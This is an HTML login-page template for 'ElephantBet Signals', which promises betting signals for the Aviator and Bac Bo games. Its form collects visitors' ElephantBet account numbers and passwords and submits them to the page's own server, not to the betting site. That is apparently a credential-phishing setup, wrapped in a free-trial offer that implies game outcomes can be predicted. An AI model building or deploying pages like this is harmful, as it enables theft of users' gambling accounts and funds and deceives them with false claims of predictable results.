<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>ElephantBet Signals - Beta</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <img src="https://i.imgur.com/0Z5Z5Z5.png" alt="Aviator Game" class="game-img aviator" />
            <img src="https://i.imgur.com/QwErTyU.png" alt="Bac Bo Game" class="game-img bacbo" />
        </div>

        <div class="login-box">
            <h1>ElephantBet Signals</h1>
            <p class="beta">BETA VERSION – FREE FOR 3 DAYS!</p>
            <p class="subtitle">
                Login with your ElephantBet account to start receiving signals
            </p>

            <form method="POST">
                <div class="input-group">
                    <input type="text" name="number" placeholder="Number" required />
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required />
                </div>
                <button type="submit" class="btn">LOGIN TO START SIGNALS</button>
            </form>

            <p class="info">
                Experimental version – signals start tomorrow. Results depend on device & connection.
            </p>
        </div>
    </div>
</body>
</html>
